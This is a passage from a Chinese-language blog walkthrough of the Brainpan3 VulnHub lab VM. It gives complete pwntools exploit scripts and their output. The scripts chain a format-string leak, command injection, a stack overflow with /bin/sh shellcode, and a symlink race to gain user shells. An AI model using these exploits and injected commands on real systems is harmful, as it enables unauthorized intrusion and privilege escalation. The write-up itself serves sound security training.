5 61616167</span><br><span class="line">   f 6 61616168</span><br><span class="line">   f 7 61616169</span><br><span class="line">   f 8 6161616a</span><br><span class="line">   f 9 6161616b</span><br><span class="line">   f 10 6161616c</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616162)</span><br></pre></td></tr></table></figure>

<p>太棒了，所以在循环字符串中的offset baaa崩溃了。让我们通过替换baaa来创建我们的payload，以了解我们拥有EIP的控制权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">&gt;&gt;&gt; shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcode</span><br><span class="line">AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>如果是正确的，应该在EIP中看到BBBB。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">[+] saving to AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x43434343 (<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line"> EIP  0x42424242 (<span class="string">&#x27;BBBB&#x27;</span>) &lt;== 真的非常的牛批！！！</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x42424242</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 42424242</span><br><span class="line">   f 1 43434343</span><br><span class="line">   f 2 43434343</span><br><span class="line">   f 3 43434343</span><br><span class="line">   f 4 43434343</span><br><span class="line">   f 5 43434343</span><br><span class="line">   f 6 43434343</span><br><span class="line">   f 7 43434343</span><br><span class="line">   f 8 43434343</span><br><span class="line">   f 9 43434343</span><br><span class="line">   f 10 43434343</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x42424242)</span><br></pre></td></tr></table></figure>

<p>还从静态分析中注意到，第二个参数存储在位于0x804a080的全局数组中。如果将shellcode写入全局数组，则可以将EIP指向该缓冲区并可能获胜。攻击计划如下：</p>
<ul>
<li>用0x804a080覆盖返回地址BBBB</li>
<li>在第二个参数中删除/bin/sh shellcode以获得一个shell</li>
</ul>
<p>我们得到的测试脚本如下：</p>
<p>test.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;./cryptor&#x27;</span>, shellcode, asm(shellcraft.sh())])</span><br><span class="line"></span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line"></span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line"></span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line"></span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: root&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>成功利用漏洞获取了本地的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python test.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./cryptor&#x27;</span>: pid 20596</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 0&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: root</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>在本地获得了一个shell。现在必须在服务器上执行此命令。为此，在现有脚本中创建命令，然后从脚本中发送命令。该完善后的脚本如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本之后，等待一小会儿，将会接收到一个reynard的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2919</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span><br><span class="line">$ whoami</span><br><span class="line">reynard</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/reynard/private</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub207.jpg"></p>
<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>再进行一次勘测，将显示以下cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/cron.d/*</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>查看/opt/.messenger的特权，看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls -la /opt</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root root 4096 May 19  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">drwxrwx---  3 root dev  4096 Feb  6 13:04 .messenger</span><br></pre></td></tr></table></figure>

<p>看到一个由root执行的命令，该命令从/opt/.messenger目录中提取文件。为此，需要具有开发人员组权限的用户。检查/etc/passwd的尾部，可以看到puck。看他的id：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id puck</span><br><span class="line">uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)</span><br></pre></td></tr></table></figure>

<p>他确实具有dev特权，允许他访问/opt/.messenger。来看看box上的puck用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/puck</span><br><span class="line">$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 May 19 23:35 ..</span><br><span class="line">-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt</span><br><span class="line">$ cat key.txt</span><br><span class="line">9H37B81HZYY8912HBU93</span><br></pre></td></tr></table></figure>

<p>box上还有其他key吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -name key* 2&gt;/dev/null</span><br><span class="line">/mnt/usb/key.txt</span><br></pre></td></tr></table></figure>

<p>不知道这些key是做什么用的。碰到一个小路障会做什么？侦察！查看netstat，看到另一个服务处于活动状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -antop | grep LIST</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br></pre></td></tr></table></figure>

<p>连接到它</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc localhost 7075</span><br><span class="line">open: No such file or directory</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>不知道它来自什么服务，执行一个系统范围的字符串来尝试查找导致此问题的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -executable &gt; exes</span><br><span class="line">$ <span class="keyword">for</span> f <span class="keyword">in</span> $(cat exes); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$f</span> &gt;&gt; output; strings <span class="variable">$f</span> | grep <span class="string">&quot;Incorrect key&quot;</span> &gt;&gt; output; <span class="keyword">done</span></span><br><span class="line">$ grep Incorrect output -B1</span><br><span class="line">/usr/<span class="built_in">local</span>/sbin/trixd</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>并确认</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ strings /usr/<span class="built_in">local</span>/sbin/trixd | grep Incorrect</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>将trixd加载到IDA中，看到二进制文件正在检查/mnt/usb/key.txt是否为符号链接，如果是，则立即退出。从这里，它同时打开/mnt/usb/key.txt和/home/puck/key.txt并检查它们是否相同。如果它们相同，将得到一个/bin/sh shell。否则，会看到错误的密钥消息。解决此问题的方法是连接到服务，删除/mnt/usb/key.txt，然后将/home/puck/key.txt符号链接到/mnt/usb/key.txt。如果时间安排正确，将在检查后进行符号链接，绕过它。不想将binjitsu放在VM本身上，可以在这部分使用标准库函数。再次，为了通过一个脚本来完成这项工作，将一个脚本写入磁盘并执行该脚本，以使的shell具有puck的功能。的新代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的代码之后，成功的拿到了puck用户的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2796</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: puck</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">$ whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub208.jpg"></p>
<h2 id="步骤6"><a href="#步骤6" class="headerlink" title="步骤6"></a>步骤6</h2><p>现在，很吃力，需要完成认为是获得root shell的最后一步的工作。回到cronjob，需要分析msg_admin二进制文件。与加密二进制文件类似的方式将其从VM中提取。快速checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec msg_admin</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>Canaries，NX上。ASLR开启了吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>该抽出所有的止损了。从cronjob中，意识到二进制文件需要一个文件。静态分析二进制文件，看到文件需要包含名称行和由|分隔的消息。创建一个小的payload生成脚本来对此进行测试。</p>
<p>make-pwnmsg.py</p>
